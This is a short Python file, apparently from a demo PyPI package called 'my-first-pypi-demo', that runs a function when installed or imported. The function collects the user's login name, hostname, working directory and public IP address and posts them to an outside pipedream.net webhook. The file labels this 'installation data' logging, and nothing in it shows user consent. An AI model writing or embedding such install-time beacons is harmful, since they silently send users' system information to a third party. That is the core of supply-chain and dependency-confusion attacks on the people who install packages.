import os
import socket
import requests
import json

def log_installation_data():
    # Gather installation-related data
    user = os.getlogin()
    hostname = socket.gethostname()
    current_path = os.getcwd()
    ip_address = requests.get('https://ifconfig.me').text.strip()

    # Prepare the data to be sent
    data = {
        'user': user,
        'hostname': hostname,
        'path': current_path,
        'ip': ip_address,
        'package': 'my-first-pypi-demo'
    }

    # Send to the specified server in JSON format
    headers = {'Content-Type': 'application/json'}
    response = requests.post('https://eo2g4jar6fvs3ah.m.pipedream.net', json=data, headers=headers)

    # Check the response status
    if response.status_code == 200:
        print("Data sent successfully!")
    else:
        print(f"Failed to send data: {response.status_code}")

# Run the logging function during installation
log_installation_data()

